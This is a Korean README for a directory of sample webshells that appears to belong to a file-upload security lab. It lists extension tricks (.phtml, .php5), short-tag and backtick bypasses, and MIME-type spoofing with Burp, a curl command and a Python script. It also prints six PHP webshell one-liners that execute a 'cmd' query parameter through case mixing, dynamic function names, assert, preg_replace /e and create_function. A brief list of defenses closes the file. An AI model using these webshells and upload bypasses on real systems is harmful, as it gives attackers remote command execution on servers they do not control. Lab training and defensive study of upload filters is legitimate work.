# 웹셸 우회 기법 샘플

이 디렉토리에는 각 난이도 레벨을 우회하기 위한 샘플 웹셸 파일들이 포함되어 있습니다.

## 사용 방법

1. `.txt` 확장자를 제거하고 적절한 확장자로 변경
2. 각 파일 내부의 주석을 읽고 우회 기법 이해
3. 해당 레벨에서 업로드 시도

## Level 2 우회 샘플

### 1. level2-phtml.phtml
- **우회 기법**: .phtml 확장자 사용
- **설명**: .php만 차단하므로 .phtml 사용
- **함수 우회**: 대소문자 혼용 (sYsTeM)

### 2. level2-php5.php5
- **우회 기법**: .php5 확장자 사용
- **함수 우회**: 백틱 연산자 사용

### 3. level2-backtick.phtml
- **우회 기법**: .phtml + 백틱 연산자
- **설명**: 함수명을 전혀 사용하지 않음

## Level 3 우회 샘플

### 1. level3-short-tag.phtml
- **우회 기법**:
  - .phtml 확장자 (.php, .php3, .php4, .phar 차단 우회)
  - `<?` 짧은 태그 (`<?php` 검증 우회)
  - 백틱 연산자 (함수 키워드 우회)
  - **중요**: MIME 타입 조작 필요!

### 2. level3-pcntl.php5
- **우회 기법**: .php5 + 짧은 태그 + pcntl_exec

## MIME 타입 조작 방법

Level 3에서는 MIME 타입 검증이 있으므로 다음 방법으로 우회:

### Burp Suite 사용
1. Burp Suite Proxy 실행
2. 브라우저 프록시 설정
3. 파일 업로드 시 요청 가로채기
4. `Content-Type: application/octet-stream` 부분을
   `Content-Type: image/png` 또는 `text/plain`으로 변경
5. Forward

### curl 명령 사용
```bash
curl -X POST \
  -F "level=3" \
  -F "file=@shell.phtml;type=image/png" \
  http://localhost:8080/upload.php
```

### Python 스크립트 사용
```python
import requests

files = {
    'file': ('shell.phtml', open('shell.phtml', 'rb'), 'image/png')
}
data = {'level': '3'}

response = requests.post('http://localhost:8080/upload.php',
                        files=files,
                        data=data)
print(response.text)
```

## 추가 우회 기법

### 1. 대소문자 혼용
```php
<?php
// system 차단 시
sYsTeM($_GET['cmd']);  // Level 2에서 가능
```

### 2. 함수명 동적 생성
```php
<?php
$a = 'sys';
$b = 'tem';
$func = $a . $b;
$func($_GET['cmd']);
```

### 3. 변수 함수 (Variable Functions)
```php
<?php
$f = 'system';
$f($_GET['cmd']);
```

### 4. assert() 사용
```php
<?php
assert($_GET['cmd']);  // PHP 7 이전
```

### 5. preg_replace /e 모디파이어 (구버전 PHP)
```php
<?php
preg_replace('/.*/e', $_GET['cmd'], '');
```

### 6. create_function (PHP 7.2 이전)
```php
<?php
$f = create_function('', $_GET['cmd']);
$f();
```

## 보안 개선 방법

실제 환경에서 이러한 공격을 방어하려면:

1. **확장자 화이트리스트 사용**
   - 블랙리스트 대신 화이트리스트 방식

2. **파일 내용 검증**
   - getimagesize() 등으로 실제 파일 형식 확인
   - Magic bytes 검증

3. **업로드 디렉토리 실행 금지**
   - nginx/apache 설정으로 PHP 실행 차단

4. **파일명 무작위화**
   - 원본 파일명 사용 금지

5. **웹 루트 외부 저장**
   - 직접 접근 불가능한 위치에 저장

6. **파일 크기 제한**
   - 적절한 크기 제한 설정
